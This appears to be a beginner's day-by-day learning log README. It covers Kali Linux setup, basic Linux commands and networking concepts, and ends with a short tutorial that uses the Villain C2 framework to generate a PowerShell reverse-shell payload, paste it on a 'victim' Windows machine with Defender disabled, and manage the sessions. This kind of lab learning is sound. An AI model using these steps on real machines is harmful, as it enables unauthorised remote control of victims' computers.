# Day1
welcome to my repository 
# Day2
I learned how to download Kali Linux for VirtualBox and use 7-Zip to extract the files. While extracting Kali Linux using 7-Zip, I faced some errors but was able to fix them successfully. I'm eager to keep learning new things.
# Day3
Learned about Linux commands such as:
→ ls (List files and directories)
→ cd (Change directory)
→ pwd (Print current working directory)
→ mkdir (Create a new directory)
→ chmod (Change file permissions), etc.
Also learned how to run and execute them in Kali Linux using VirtualBox.
I'm excited to learn more new things ahead!

->NAT (Network Address Translation):
       NAT is a networking process used to modify IP address information in packet headers while they are in transit across        a router or firewall.
       -->It allows multiple devices on a private network to share a single public IP address.
       -->Adds a layer of security by hiding internal IP addresses from external networks.
->Difference between TCP (Transmission Control Protocol) and UDP (User Datagram Protocol):
       1.Connection – TCP is connection-oriented (uses a handshake), while UDP is connectionless and sends data without             establishing a session.
       2. Reliability – TCP ensures reliable data transfer with acknowledgments and retransmissions; UDP does not guarantee        delivery.
       3.Speed – TCP is slower due to error checking and connection management, while UDP is faster because it has minimal         overhead.
       4.Security Risks – TCP can be targeted by attacks like SYN flooding and session hijacking, whereas UDP is vulnerable         to spoofing and amplification attacks.
->IP Address (Internet Protocol Address):
       Each device connected to a network is assigned an IP address to identify it.
        Currently, we are receiving **Dynamic IP Addresses** (assigned automatically and may change).
->IPv4 (Internet Protocol version 4):
        Format: 32-bit (e.g., `192.168.1.1`)
        Supports about 4.3 billion unique addresses.
->MAC Address (Media Access Control Address)
        Each device has a unique MAC address assigned to its network interface card.
        This address rarely changes and is used for communication within a local network.
->Port Forwarding:
        Port forwarding is a networking technique that redirects traffic from an external IP and port to an internal device         on a private network.
         It is useful for remote access to services.
         However, it can be risky if misconfigured, as it may expose internal services to attackers.

Creating Reverse shell for Windows Hacking using Villain FrameWork:
-->Villain is a C2 (Command & Control) framework for managing reverse shells and backdoors across multiple machines.
**1. Install Villain**

```bash
git clone https://github.com/t3l3machus/Villain.git
cd Villain
sudo apt update
sudo apt install python3 python3-pip
pip3 install -r requirements.txt
```

**2. Launch Villain**

```bash
cd Villain
sudo python3 Villain.py
```

**3. On Victim Windows Machine**

* Turn off **Windows Defender** → Real-time protection **OFF**.

**4. Generate & Execute Payload**

* In Villain:

  ```bash
  generate payload=windows/reverse_tcp/powershell lhost=<Your_IP> lport=4444
  ```
* Copy payload → Paste into **Windows PowerShell** → Press **Enter**.

**5. Manage Sessions**

* `sessions` → View active sessions.
* `shell <ID>` → Interact with a session.
